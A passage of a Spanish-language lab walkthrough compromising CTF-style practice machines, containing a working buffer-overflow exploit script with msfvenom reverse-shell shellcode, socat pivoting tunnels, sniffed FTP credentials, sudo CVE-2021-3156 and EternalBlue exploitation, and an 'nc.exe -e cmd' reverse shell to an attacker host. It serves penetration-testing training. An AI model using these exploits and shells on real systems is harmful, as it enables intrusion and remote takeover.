kfaak
```

Volvemos a ejecutar el binario e introducimos el patrón generado. Mediante el comando `pattern offset $eip` sabemos que cantidad de caracteres tenemos que introducir hasta llegar a sobreescribir el `eip`

```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffccec  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x62616162 ("baab"?)
$ecx   : 0xffffd2b0  →  "our spell: "
$edx   : 0xffffd0f4  →  "our spell: "
$esp   : 0xffffcd60  →  "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
$ebp   : 0x62616163 ("caab"?)
$esi   : 0x80b3158  →  "../csu/libc-start.c"
$edi   : 0xffffd2a8  →  "\nEnter your spell: "
$eip   : 0x62616164 ("daab"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcd60│+0x0000: "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"	← $esp
0xffffcd64│+0x0004: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
0xffffcd68│+0x0008: "gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]"
0xffffcd6c│+0x000c: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
0xffffcd70│+0x0010: "iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]"
0xffffcd74│+0x0014: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
0xffffcd78│+0x0018: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
0xffffcd7c│+0x001c: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x62616164
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "server_hogwarts", stopped 0x62616164 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset $eip
[+] Searching for '$eip'
[+] Found at offset 112 (little-endian search) likely
[+] Found at offset 304 (big-endian search) 
```

En este punto ya sabemos que necesitamos introducir 112 `A`s hasta llegar al `eip`. Lo comprobamos generando un payload con python

```bash
❯ python3 -c 'print("A"*112 + "B"*4 + "C"*100)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```

```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffccec  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xffffcf80  →  0x00000a ("\n"?)
$edx   : 0xffffcdc4  →  0x00000a ("\n"?)
$esp   : 0xffffcd60  →  "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x80b3158  →  "../csu/libc-start.c"
$edi   : 0xffffd2a8  →  "\nEnter your spell: "
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcd60│+0x0000: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"	← $esp
0xffffcd64│+0x0004: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcd68│+0x0008: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcd6c│+0x000c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcd70│+0x0010: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcd74│+0x0014: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcd78│+0x0018: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcd7c│+0x001c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "server_hogwarts", stopped 0x42424242 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

En este punto observamos que `eip` vale `0x42424242` que corresponden a las 4 B's que hemos introducido en el payload. El `esp` apunta al comienzo de nuestras C's. Hay que lograr que `eip` apunte a una dirección la cual aplique a nivel de Op. Code (Operation Code) un JUMP al `esp` para que una vez entre en el `esp` en lugar de insertar C's podamos insertar shellcode que nos va a garantizar ejecución en la pila. Antes de empezar el script generamos el shellcode con la herramienta `msfvenom`

```bash
❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.148 LPORT=443 -b "\x00" -f py -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of py file: 550 bytes
shellcode =  b""
shellcode += b"\xda\xcd\xd9\x74\x24\xf4\xba\xdd\x4d\x93\xc6"
shellcode += b"\x5d\x2b\xc9\xb1\x12\x31\x55\x17\x03\x55\x17"
shellcode += b"\x83\x30\xb1\x71\x33\xfb\x91\x81\x5f\xa8\x66"
shellcode += b"\x3d\xca\x4c\xe0\x20\xba\x36\x3f\x22\x28\xef"
shellcode += b"\x0f\x1c\x82\x8f\x39\x1a\xe5\xe7\x79\x74\x14"
shellcode += b"\x63\x11\x87\x17\x8a\x59\x0e\xf6\x3c\xfb\x41"
shellcode += b"\xa8\x6f\xb7\x61\xc3\x6e\x7a\xe5\x81\x18\xeb"
shellcode += b"\xc9\x56\xb0\x9b\x3a\xb6\x22\x35\xcc\x2b\xf0"
shellcode += b"\x96\x47\x4a\x44\x13\x95\x0d"
```

Debemos saber el operation code correspondiente al salto al `esp`. Utilizaremos la apliación `nasm_shell.rb` del framework metasploit. El operation code es `FFE4`

```bash
❯ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp ESP
00000000  FFE4              jmp esp
```

Con la herramienta `objdump` vemos que direcciones hay donde se aplica el salto al `esp`. Encontramos la dirección `8049d55`

```bash
❯ objdump -D server_hogwarts| grep "ff e4"
 8049d55:	ff e4                	jmp    *%esp
 80b322c:	81 73 f6 ff e4 73 f6 	xorl   $0xf673e4ff,-0xa(%ebx)
 80b3253:	ff 91 73 f6 ff e4    	call   *-0x1b00098d(%ecx)
 80b500f:	ff e4                	jmp    *%esp
 80b51ef:	ff e4                	jmp    *%esp
 80b546f:	ff e4                	jmp    *%esp
 80d0717:	ff e4                	jmp    *%esp
```

El script quedaría definido de la siguiente forma

```python
#!/usr/bin/python3

import socket

offset = 112
before_eip = b"A" * offset

eip = b"\x55\x9d\x04\x08" # 8049d55 -> jmp ESP

shellcode =  b""
shellcode += b"\xda\xcd\xd9\x74\x24\xf4\xba\xdd\x4d\x93\xc6"
shellcode += b"\x5d\x2b\xc9\xb1\x12\x31\x55\x17\x03\x55\x17"
shellcode += b"\x83\x30\xb1\x71\x33\xfb\x91\x81\x5f\xa8\x66"
shellcode += b"\x3d\xca\x4c\xe0\x20\xba\x36\x3f\x22\x28\xef"
shellcode += b"\x0f\x1c\x82\x8f\x39\x1a\xe5\xe7\x79\x74\x14"
shellcode += b"\x63\x11\x87\x17\x8a\x59\x0e\xf6\x3c\xfb\x41"
shellcode += b"\xa8\x6f\xb7\x61\xc3\x6e\x7a\xe5\x81\x18\xeb"
shellcode += b"\xc9\x56\xb0\x9b\x3a\xb6\x22\x35\xcc\x2b\xf0"
shellcode += b"\x96\x47\x4a\x44\x13\x95\x0d"

after_eip = b"\x90"*32 + shellcode # ESP

payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9898))
s.send(payload)
s.close()
```

Ejecutamos el binario, nos ponemos en escucha en el puerto 443 y ejectuamos script para comrprobar que funciona de manera local

<img src="/assets/VH/eCPPTv2-Lab/boflocal.png">

Ya sabemos que en local funciona por lo que procedemos a modificar el script para ejecutar el BoF en la máquina `Fawkes`. Primero debemos generar un shellcode nuevo el cual establezaca la reverse shell a su nodo más cercano que es la máquina `Nagini`

```bash
❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.129 LPORT=5555 -b "\x00" -f py -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of py file: 550 bytes
shellcode =  b""
shellcode += b"\xba\x6d\x91\x8a\x9b\xdb\xce\xd9\x74\x24\xf4"
shellcode += b"\x5d\x29\xc9\xb1\x12\x83\xed\xfc\x31\x55\x0e"
shellcode += b"\x03\x38\x9f\x68\x6e\xf3\x44\x9b\x72\xa0\x39"
shellcode += b"\x37\x1f\x44\x37\x56\x6f\x2e\x8a\x19\x03\xf7"
shellcode += b"\xa4\x25\xe9\x87\x8c\x20\x08\xef\xce\x7b\x8e"
shellcode += b"\x6e\xa6\x79\x4f\x65\x84\xf7\xae\x35\x8c\x57"
shellcode += b"\x60\x66\xe2\x5b\x0b\x69\xc9\xdc\x59\x01\xbc"
shellcode += b"\xf3\x2e\xb9\x28\x23\xfe\x5b\xc0\xb2\xe3\xc9"
shellcode += b"\x41\x4c\x02\x5d\x6e\x83\x45"
```

Sustituimos el shellcode en el script y modificamos IP. El script se quedaría de la siguiente forma

```python
#!/usr/bin/python3

import socket

offset = 112
before_eip = b"\x41" * offset

eip = b"\x55\x9d\x04\x08" # 8049d55 -> jmp ESP

shellcode =  b""
shellcode += b"\xba\x6d\x91\x8a\x9b\xdb\xce\xd9\x74\x24\xf4"
shellcode += b"\x5d\x29\xc9\xb1\x12\x83\xed\xfc\x31\x55\x0e"
shellcode += b"\x03\x38\x9f\x68\x6e\xf3\x44\x9b\x72\xa0\x39"
shellcode += b"\x37\x1f\x44\x37\x56\x6f\x2e\x8a\x19\x03\xf7"
shellcode += b"\xa4\x25\xe9\x87\x8c\x20\x08\xef\xce\x7b\x8e"
shellcode += b"\x6e\xa6\x79\x4f\x65\x84\xf7\xae\x35\x8c\x57"
shellcode += b"\x60\x66\xe2\x5b\x0b\x69\xc9\xdc\x59\x01\xbc"
shellcode += b"\xf3\x2e\xb9\x28\x23\xfe\x5b\xc0\xb2\xe3\xc9"
shellcode += b"\x41\x4c\x02\x5d\x6e\x83\x45"

after_eip = b"\x90" * 32 + shellcode # ESP

payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.100.130", 9898))
s.send(payload)
s.close()
```

Tenemos que redirigir el flujo de la conexión con la herramienta socat. Subimos socat a la máquina Nagini y ejecutamos indicando que todas las peticiones que lleguen por el puerto 5555 las redirija a la máquina Aragog por el puerto 5556 y a su vez, en la máquina Aragog decimos con la herramienta socat que todas las peticiones que nos lleguen por el puerto 5556 las redirija a nuestra máquina atacante por el puerto 443. Nos ponemos en escucha y ejecutamos script a través de proxychains

```bash
#NAGINI
root@Nagini:/tmp# ./socat TCP-LISTEN:5555,fork TCP:10.10.0.134:5556

#ARAGOG
root@Aragog:/tmp# ./socat TCP-LISTEN:5556,fork TCP:192.168.1.148:443
```

<img src="/assets/VH/eCPPTv2-Lab/fawkesbof.png">

### Docker Container (Fawkes)

* * *

Listamos interfaces de red y vemos que hemos ganado acceso a un contenedor. Si listamos privilegios de sudo vemos que podemos ejecutar cualquier instrucción sin proporcionar contraseña. Migramos a usuario root

```bash
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
sudo -l
User harry may run the following commands on 2b1599256ca6:
    (ALL) NOPASSWD: ALL
sudo /bin/sh
whoami
root
```

En el directorio `/root` encontramos un Horcrux y un archivo `note.txt`

```bash
cd /root
ls
horcrux1.txt
note.txt
cat horcrux1.txt
horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=}
echo "NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=" | base64 -d
6: HaRrY PotTer dEsTrOyed by volDeMorT
cat note.txt
Hello Admin!!

We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.
```

Nos dan una pista. Al parecer alguien está tratando de conectarse al servidor FTP y nos piden que analicemos el tráfico para localizar al usuario. Usaremos la herramienta `tcpdump` para esta tarea

```bash
tcpdump -i eth0 port ftp or ftp-data
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
13:24:01.662404 IP 172.17.0.1.44818 > 2b1599256ca6.21: Flags [S], seq 2719636073, win 64240, options [mss 1460,sackOK,TS val 675469876 ecr 0,nop,wscale 7], length 0
13:24:01.662413 IP 2b1599256ca6.21 > 172.17.0.1.44818: Flags [S.], seq 1625148687, ack 2719636074, win 65160, options [mss 1460,sackOK,TS val 1618220132 ecr 675469876,nop,wscale 7], length 0
13:24:01.662425 IP 172.17.0.1.44818 > 2b1599256ca6.21: Flags [.], ack 1, win 502, options [nop,nop,TS val 675469876 ecr 1618220132], length 0
13:24:01.662842 IP 2b1599256ca6.21 > 172.17.0.1.44818: Flags [P.], seq 1:21, ack 1, win 510, options [nop,nop,TS val 1618220133 ecr 675469876], length 20: FTP: 220 (vsFTPd 3.0.3)
13:24:01.662889 IP 172.17.0.1.44818 > 2b1599256ca6.21: Flags [.], ack 21, win 502, options [nop,nop,TS val 675469877 ecr 1618220133], length 0
13:24:01.662929 IP 172.17.0.1.44818 > 2b1599256ca6.21: Flags [P.], seq 1:15, ack 21, win 502, options [nop,nop,TS val 675469877 ecr 1618220133], length 14: FTP: USER neville
13:24:01.662931 IP 2b1599256ca6.21 > 172.17.0.1.44818: Flags [.], ack 15, win 510, options [nop,nop,TS val 1618220133 ecr 675469877], length 0
13:24:01.662972 IP 2b1599256ca6.21 > 172.17.0.1.44818: Flags [P.], seq 21:55, ack 15, win 510, options [nop,nop,TS val 1618220133 ecr 675469877], length 34: FTP: 331 Please specify the password.
13:24:01.663016 IP 172.17.0.1.44818 > 2b1599256ca6.21: Flags [P.], seq 15:30, ack 55, win 502, options [nop,nop,TS val 675469877 ecr 1618220133], length 15: FTP: PASS bL!Bsg3k
13:24:01.704687 IP 2b1599256ca6.21 > 172.17.0.1.44818: Flags [.], ack 30, win 510, options [nop,nop,TS val 1618220175 ecr 675469877], length 0
13:24:05.401490 IP 2b1599256ca6.21 > 172.17.0.1.44818: Flags [P.], seq 55:77, ack 30, win 510, options [nop,nop,TS val 1618223871 ecr 675469877], length 22: FTP: 530 Login incorrect.
13:24:05.401587 IP 172.17.0.1.44818 > 2b1599256ca6.21: Flags [P.], seq 30:36, ack 77, win 502, options [nop,nop,TS val 675473615 ecr 1618223871], length 6: FTP: QUIT
13:24:05.401594 IP 2b1599256ca6.21 > 172.17.0.1.44818: Flags [.], ack 36, win 510, options [nop,nop,TS val 1618223872 ecr 675473615], length 0
```

Obtenemos unas credenciales del usuario `neville`. Logramos conectarnos por ssh a la máquina Fawkes con las credenciales obtenidas. En el directorio personal de `neville` encontramos otro horcrux

```bash
❯ proxychains ssh neville@192.168.100.130
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:8888-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.130:22-<><>-OK
neville@192.168.100.130 s password: 
Linux Fawkes 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
neville@Fawkes:~$ ls
horcrux2.txt
neville@Fawkes:~$ cat horcrux2.txt 
horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t}
neville@Fawkes:~$ echo "NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t" | base64 -d; echo
7: NaGiNi tHe SnAke deStroYed By NeVille LonGboTTom
```

### Escalada de Privilegios (Fawkes)

* * *

Listamos archivos de la máquina con privilegios SUID y vemos que sudo está. Verificamos la versión de sudo que es la 1.8.27

```bash
neville@Fawkes:~$ cd /
neville@Fawkes:/$ find \-perm -4000 2>/dev/null
./usr/local/bin/sudo
./usr/bin/newgrp
./usr/bin/chfn
./usr/bin/mount
./usr/bin/su
./usr/bin/passwd
./usr/bin/chsh
./usr/bin/gpasswd
./usr/bin/umount
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
neville@Fawkes:/$ sudo --version
Sudo version 1.8.27
Sudoers policy plugin version 1.8.27
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.27
```

Viendo la versión de sudo sabemos que es vulnerable a CVE-2021-3156 por lo que podemos utilizar el exploit `exploit_nss.py` del repositorio de GitHub de [worawit](https://github.com/worawit/CVE-2021-3156) para elevar privilegios. Debemos modificar el valor de la variable `SUDO_PATH` puesto que está contemplada la ruta `/usr/bin/sudo` y nuestro binario se encuentra en `/usr/local/bin/sudo`. Una vezs adaptado el script lo ejecutamos y elevamos privilegios. El último horcrux se encuentra ela carpeta `/root`

```bash
neville@Fawkes:/tmp$ python3 exploit.py 
# whoami
root
# cd /root
# ls
horcrux3.txt
# cat horcrux3.txt
__     __    _     _                           _     _     
\ \   / /__ | | __| | ___ _ __ ___   ___  _ __| |_  (_)___ 
 \ \ / / _ \| |/ _` |/ _ \ '_ ` _ \ / _ \| '__| __| | / __|
  \ V / (_) | | (_| |  __/ | | | | | (_) | |  | |_  | \__ \
   \_/ \___/|_|\__,_|\___|_| |_| |_|\___/|_|   \__| |_|___/
                                                           
     _       __            _           _ 
  __| | ___ / _| ___  __ _| |_ ___  __| |
 / _` |/ _ \ |_ / _ \/ _` | __/ _ \/ _` |
| (_| |  __/  _|  __/ (_| | ||  __/ (_| |
 \__,_|\___|_|  \___|\__,_|\__\___|\__,_|
                                         


Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Hard
Machine Name: Fawkes
Horcruxes Hidden in this VM: 3 horcruxes

You have successfully pwned Fawkes machine & defeated Voldemort.
Here is your last hocrux: horcrux_{ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==}




# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com

# echo "ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==" | base64 -d;echo
8: VolDeMorT dEfeAted bY hArrY PoTTeR
```

### Reconocimiento (Dumbledore)

* * *

Técnicas Vistas (Dumbledore): 

- **Eternalblue (MS17-010) Exploitation in order to gain access to the Dumbledore-PC machine**
- **Host discovery from Windows MSDOS + ARP command**
- **Uploading Chisel to the Windows machine**
- **Creating a new SOCKS5 connection to gain access to the Matrix 1 machine (Triple SOCKS5 Proxy)**

Sabemos que la IP de la máquina `Dumbledore` es 192.168.100.131, dato que confirmamos cuando creamos el script hostDiscovery.sh en la máquina Nagini. Ahora procedemos a enumerar los puertos abiertos mediante la herramienta `nmap`

```bash
❯ proxychains nmap -sT -Pn --top-ports 500 -open -T5 -v -n 192.168.100.131 2>/dev/null

PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
```

Observamos el puerto 445 abierto. Con la ayuda de `crackmapexec` vamos a identificar ante que sistema estamos

```bash
❯ proxychains crackmapexec smb 192.168.100.131 2>/dev/null
ProxyChains-3.1 (http://proxychains.sf.net)
SMB         192.168.100.131 445    WIN-5OU2D4F1DCJ  [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:WIN-5OU2D4F1DCJ) (domain:WIN-5OU2D4F1DCJ) (signing:False) (SMBv1:True)
```

Siendo un Windows 7 y con el puerto 445 expuesto nos viene a la cabeza la vulnerabiliadad `Eternal Blue`. Utilizaremos el repositorio de `3ndG4me` [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010). Nos lo clonamos en nuestro equipo. Primero de todo con el script `eternal_checker.py` verificamos que sea vulnerable y no esté parcheado

```bash
❯ proxychains python3 eternal_checker.py 192.168.100.131
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:8888-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.131:445-<><>-OK
[*] Target OS: Windows 7 Professional 7601 Service Pack 1
[!] The target is not patched
=== Testing named pipes ===
[+] Found pipe 'netlogon'
```

Verificamos que es vulnerable y tenemos named pipes de las que poder abusar. Ejecutamos el script `zzz_exploit.py` y ganamos acceso a la máquina Dumbledore

```bash
❯ proxychains python2 zzz_exploit.py 192.168.100.131
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:8888-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.131:445-<><>-OK
[*] Target OS: Windows 7 Professional 7601 Service Pack 1
[+] Found pipe 'netlogon'
[+] Using named pipe: netlogon
[*] Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8003c13020
SESSION: 0xfffff8a0025e1060
FLINK: 0xfffff8a0026bf088
InParam: 0xfffff8a0026b915c
MID: 0x1a03
[+] success controlling groom transaction
[*] modify trans1 struct for arbitrary read/write
[*] make this SMB session to be SYSTEM
[*] overwriting session security context
[*] have fun with the system smb session!
[!] Dropping a semi-interactive shell (remember to escape special chars with ^) 
[!] Executing interactive programs will hang shell!
C:\Windows\system32>whoami
nt authority\system
```

Ejecutamos `ipconfig` y nos revela una segunda interfaz de red con IP 172.18.0.130 correspondiente a otro segmento de red

```bash
C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : localdomain
   Link-local IPv6 Address . . . . . : fe80::b8e9:748a:86aa:9079%21
   IPv4 Address. . . . . . . . . . . : 172.18.0.130
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

Ethernet adapter Bluetooth Network Connection:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : localdomain
   Link-local IPv6 Address . . . . . : fe80::2d04:dd66:a8e7:e95d%11
   IPv4 Address. . . . . . . . . . . : 192.168.100.131
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 
```

La consola que tenemos de la máquina Dumbledore no es plenamente funcional. Vamos a transferir un binario de la herramienta `netcat` desde nuestra máquina atacante. Para ello debemos crear unos túneles para redirigir el flujo de las peticiones

```bash
#NAGINI
root@Nagini:/tmp# ./socat TCP-LISTEN:445,fork TCP:10.10.0.134:445

#ARAGOG
root@Aragog:/tmp# ./socat TCP-LISTEN:445,fork TCP:192.168.1.148:445
```

```bash
#DUMBLEDORE
C:\Windows\system32>dir \\192.168.100.129\smbFolder\
 Volume in drive \\192.168.100.129\smbFolder has no label.
 Volume Serial Number is ABCD-EFAA

 Directory of \\192.168.100.129\smbFolder

02/11/2023  01:13 PM           828,098 linpeas.sh
02/12/2023  12:30 PM         3,104,768 pspy64
02/12/2023  01:57 PM         8,384,512 chisel
02/12/2023  06:05 PM           375,176 socat
09/16/2011  11:52 PM            38,616 nc.exe
09/16/2011  11:52 PM            45,272 nc64.exe
               6 File(s)     12,776,442 bytes
               0 Dir(s)  309,135,249,802,944 bytes free
C:\Windows\system32>copy \\192.168.100.129\smbFolder\nc64.exe C:\Windows\Temp\nc.exe
        1 file(s) copied.

#ATACANTE
❯ smbserver.py smbFolder $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.1.142,39530)
[*] AUTHENTICATE_MESSAGE (\,WIN-5OU2D4F1DCJ)
[*] User WIN-5OU2D4F1DCJ\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:smbFolder)
[*] Closing down connection (192.168.1.142,39530)
[*] Remaining connections []
[*] Incoming connection (192.168.1.142,39532)
[*] AUTHENTICATE_MESSAGE (\,WIN-5OU2D4F1DCJ)
[*] User WIN-5OU2D4F1DCJ\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:smbFolder)
[*] Disconnecting Share(1:smbFolder)
[*] Closing down connection (192.168.1.142,39532)
[*] Remaining connections []
```

Aprovechamos los túneles creados para enviarnos una reverse shell plenamente funcional a nuestro equipo por el puerto 445

```bash
#DUMBLEDORE
C:\Windows\system32>C:\Windows\Temp\nc.exe -e cmd 192.168.100.129 445

#ATACANTE
❯ rlwrap nc -nlvp 445
listening on [any] 445 ...
connect to [192.168.1.148] from (UNKNOWN) [192.168.1.142] 39534
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
nt authority\system
```

Para escanear los hosts disponibles en el rango 172.18.0.0/24 aprovecharemos la herramienta `ping` y `arp`

```bash
arp -d
arp -d

for /L %a in (1,1,254) do @start /b ping 172.18.0.%a -w 100 -n 2 >nul
for /L %a in (1,1,254) do @start /b ping 172.18.0.%a -w 100 -n 2 >nul

arp -a
arp -a

Interface: 192.168.100.131 --- 0xb
  Internet Address      Physical Address      Type
  192.168.100.129       00-0c-29-52-41-1d     dynamic   

Interface: 172.18.0.130 --- 0x15
  Internet Address      Physical Address      Type
  172.18.0.1            00-50-56-c0-00-04     dynamic   
  172.18.0.132          00-0c-29-18-a0-c5     dynamic   
  172.18.0.254          00-50-56-f4-6a-8b     dynamic   

ping -n 1 172.18.0.132
ping -n 1 172.18.0.132

Pinging 172.18.0.132 with 32 bytes of data:
Reply from 172.18.0.132: bytes=32 time<1ms TTL=64

Ping statistics for 172.18.0.132:
    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

